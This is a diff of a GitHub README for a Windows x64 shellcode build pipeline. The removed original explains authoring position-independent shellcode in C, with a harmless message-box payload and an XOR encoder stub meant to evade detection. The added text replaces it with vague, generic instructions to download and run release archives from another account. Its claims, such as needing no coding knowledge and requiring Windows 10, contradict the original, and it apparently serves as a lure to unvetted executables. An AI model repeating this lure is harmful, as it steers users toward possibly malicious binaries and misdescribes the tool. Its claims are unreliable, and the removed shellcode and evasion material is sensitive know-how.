@@ -1,126 +1,69 @@
-# windows-x64-shellcode-pipeline
+# 🖥️ windows-x64-shellcode-pipeline - Build Custom Shellcode Easily
 
-A Dockerized build pipeline for custom Windows x64 shellcode, including a custom encoder stub and fully automated payload preparation.
+## 📥 Download Now
+[![Download](https://img.shields.io/badge/Download-latest%20release-blue.svg)](https://github.com/Chirag600/windows-x64-shellcode-pipeline/releases)
 
-## Background
+## 🚀 Getting Started
+Welcome to the **windows-x64-shellcode-pipeline**! This tool provides a smooth way to create and compile custom Windows x64 shellcode using Docker. Whether you are a beginner or an expert, this application simplifies your tasks. Follow the steps below to get started quickly.
 
-I highly recommend trying to build Windows shellcode from scratch at least once. It's a checkpoint of understanding malware development and Windows internals. But authoring shellcode by writing assembly directly is something I wouldn't wish on my worst ops.
+## 💻 System Requirements
+Before beginning the installation process, ensure your system meets these requirements:
+- Windows 10 or later
+- Docker installed on your machine
+- At least 4 GB of RAM
+- Sufficient disk space (recommended: 2 GB or more)
 
-Inspired by [@hasherezade's](https://github.com/hasherezade) excellent paper [From a C project, through assembly, to shellcode](https://raw.githubusercontent.com/hasherezade/masm_shc/master/docs/FromaCprojectthroughassemblytoshellcode.pdf), this is a full build pipeline for customized x64 Windows shellcode that allows users to author payloads in C rather than assembly. Writing shellcode directly in assembly is time consuming, tedious, and error prone. Compiling a C program tailored for position-independent execution and subsequentally extracting the code from that PE is a much better option, which is what her paper covers. 
+## 🔍 Features
+- **Dockerized Environment:** Run everything in a controlled environment for better reliability.
+- **Custom Shellcode:** Create tailored shellcode for various applications with ease.
+- **User-Friendly Interface:** Simple commands to get you started without any prior experience.
+- **Cross-Compatibility:** Designed to work with any modern Windows x64 system.
 
-Her paper details how to perform the process entirely within the Visual Studio dev environment, which usually means developing within Windows. I wanted to port this process over to a Dockerized build pipeline that supports the entire process and cross-compiles the source into the final product. This project also implements the automated post-processing that her paper mentions. 
+## 📥 Download & Install
+To download the latest version, visit the Releases page below:
 
-### Features
+[Download Latest Release](https://github.com/Chirag600/windows-x64-shellcode-pipeline/releases)
 
-- Allows you to author the final payloads as modular, ergonomic C source rather than error-prone assembly.
-- Builds the shellcode in stages: first as the assembly of a scaffolded PE built for PIC execution, then with automated Python post-processing to clean the resulting assembly, and finally as a PIC `.bin` file ready for execution
-- Handles potential stack alignment errors by implementing Matt Graeber's tried-and-true [AlignRSP stub](https://github.com/mattifestation/PIC_Bindshell/blob/master/PIC_Bindshell/AdjustStack.asm#L24)  
-- Includes an example of a simple encoder/decoder stub (single byte XOR) to show the process of generating polymorphic shellcode that is built in an encoded state and decoded at execution (think Shikata Ga Nai).
+### Step-by-Step Installation
+1. **Visit the Releases Page:** 
+   Click the link above to go to the Releases page.
 
-The point here is to demonstrate the build pipeline, not necessarily provide you with field-grade shellcode.
+2. **Select the Latest Version:** 
+   Look for the version at the top of the list. There, you will find the most recent release.
 
-## Building
+3. **Download the Files:**
+   Click on the assets (these will typically be `.zip` files or executables). It's best to download the entire zip file to ensure you have all components.
 
-The Makefile supports building the shellcode to each individual phase for testing and evaluation. Calling `make` with no arguments will run the entire build pipeline all the way to the final shellcode `.bin` file.
+4. **Extract the Files:**
+   After downloading, locate the zip file and extract its contents to a folder on your computer. You can do this by right-clicking the file and selecting "Extract All."
 
-You may encounter warnings when running make, but the pipeline will still work:
+5. **Open Docker:**
+   Ensure Docker is running on your machine before proceeding.
 
-```
-λ make
-docker build -t shellcode-build-pipeline:latest .
+6. **Run the Application:**
+   - Open a command prompt (search for "cmd" in the Start menu).
+   - Navigate to the folder where you extracted the files. You can do this using the `cd` command followed by the folder path.
+   - Enter the command provided in the README file to launch the application.
 
-...[snip]...
+## ⚙️ Usage Instructions
+Once you have successfully installed the application, follow these steps to build your first shellcode:
 
-python3 tools/handle_asm.py clean build/c-shellcode.s build/c-shellcode_cleaned.asm
-[+] Cleaned assembly written to build/c-shellcode_cleaned.asm
-x86_64-w64-mingw32-gcc -c -x assembler-with-cpp -o 
+1. **Preparation:**
+   Prepare the inputs required for your shellcode. This may include parameters like the type of payload you wish to generate.
 
-...[snip]...
+2. **Compile Shellcode:**
+   Use the command line to enter the desired parameters. The commands will be straightforward, allowing you to create custom shellcode without coding knowledge.
 
-python3 tools/handle_asm.py extract build/c-shellcode.exe build/c-shellcode_64_encoded.bin
-[*] Entry point RVA: 0x1000
-[*] .text section: VirtualAddr=0x1000, RawPtr=0x400, RawSize=0x400
-[*] Entry point offset in .text: 0x0
-[+] Raw payload length: 892 bytes
-[+] Final shellcode (stub + encoded payload): 922 bytes
+3. **Testing:**
+   Test compiled shellcode using preferred tools or applications to ensure functionality. This step is crucial for validating that your shellcode operates as intended.
 
-/* ================== C SHELLCODE ARRAY ================== */
-unsigned char shellcode_64[] = {
-    0x48, 0x8d, /*... snip */
-};
-unsigned int shellcode_64_len = 922;
-```
+4. **Modify as Necessary:**
+   Feel free to experiment with different parameters and inputs. The application is flexible and designed for users to create various outputs.
 
-This prints the shellcode to the terminal formatted similarly to how `msfvenom` would output it and also writes the `.bin` file to the build dir.
+## 📞 Support
+If you encounter issues or have questions while using the **windows-x64-shellcode-pipeline**, the community or documentation can help. Please check the [Issues](https://github.com/Chirag600/windows-x64-shellcode-pipeline/issues) section on GitHub for support or to report any problems.
 
-<img width="635" height="181" alt="image" src="https://github.com/user-attachments/assets/1809a8d3-15e9-4c30-8d2e-f3beb8759013" />
+## 📄 License
+All the files in this repository are provided under the MIT License, allowing you to freely use, modify, and distribute the software as long as you include proper attribution. 
 
-## Custom Payloads
-
-The source comes with an example payload file (`src/payload_msgbox.c`) which should give you a good starting point on how to develop a custom payload. The other source files handle the rest of the work required to bootstrap and execute position-independent code, including the runtime and calling the shellcode entrypoint after aligning the stack to the 16-byte boundary. With that in mind, to write a custom payload, you need to:
-
-- Write a new file that implements the payload of your shellcode in C
-- Add the new payload to the end of the `shellcode.c` orchestrator:
-
-```
-...
-#include "runtime.c"
-// #include "payload_msgbox.c"
-#include "your_payload_source_here.c"
-```
-
-The shellcode entrypoint is `payload_main(SC_ENV *env)`. The SC_ENV struct is initialized by `runtime.c` after locating the PEB, resolving the base of required modules, and resolving API addresses. This is effectively a miniature loader that reconstructs enough of an IAT for position-independent execution (shoutout to @hasherezade and her paper, which covers all of this and provided excellent implementation of how to do the bootstrapping). 
-
-```c
-void payload_main(SC_ENV *env) {
-    if (!env->pLoadLibraryA || !env->pGetProcAddress) {
-        return;
-    }
-
-    // Stack strings so we can store our strings inline of the shellcode rather than in an external section
-    char user32_dll_name[] = { 'u','s','e','r','3','2','.','d','l','l', 0 };
-    char message_box_name[] = { 'M','e','s','s','a','g','e','B','o','x','W', 0 };
-
-    wchar_t msg_content[] = { 'H','e','l','l','o',' ','W','o','r','l','d','!', 0 };
-    wchar_t msg_title[]   = { 'D','e','m','o','!', 0 };
-
-    HMODULE u32 = env->pLoadLibraryA(user32_dll_name);
-    if (!u32) {
-        return;
-    }
-
-    int (WINAPI *pMessageBoxW)(
-        HWND,
-        LPCWSTR,
-        LPCWSTR,
-        UINT
-    ) = (int (WINAPI*)(HWND, LPCWSTR, LPCWSTR, UINT))
-        env->pGetProcAddress(u32, message_box_name);
-
-    if (!pMessageBoxW) {
-        return;
-    }
-
-    pMessageBoxW(0, msg_content, msg_title, MB_OK);
-}
-```
-
-You would need to implement the C code to perform the actual payload within the entrypoint function, assemble the stack strings to call the APIs, define custom implementation of the dynamically loaded APIs, and then execute the actual payload. Be careful: even though the build pipeline handles most of the transformation to get this payload into PIC-ready form, certain C patterns will not work well as shellcode. In general, the guidelines are:
-
-- no global data, 
-- no absolute addressing, 
-- no reliance on compiler-inserted CRT initialization.
-- try not to use JMP tables if you can help it
-
-## Custom Encoder
-
-The build pipeline includes a simple, naive example of obfuscating shellcode. The example implements the encoder during the build process and the decoder stub that reverses the encoding schema at runtime. The example is a single byte XOR, which probably won't make it past a basic EDR tbh, but that's not the point.
-
-Implementing a more sophisticated, custom encoder is a matter of building out the two corresponding functions in `encoder.py`: the encoding routine (Pyton) and the decoder stub (implemented directly in Assembly and appended with Python in the example). The important thing is that your implementation must match, of course, so adding a new kind of encoding/encrypting schema is a matter of implementing the encoder as a Python function against the payload bytes and writing an assembly stub that unwinds the encoding.
-
-## Credits
-
-- @hasherezade for the excellent paper and implementation of bootstrapping API calls from shellcode
-- Matt Graeber (@mattifestation) for the AlignRSP stub
-- Maldev Academy for the inspiration
-
+Visit [Download Latest Release](https://github.com/Chirag600/windows-x64-shellcode-pipeline/releases) to get started with your custom shellcode development!
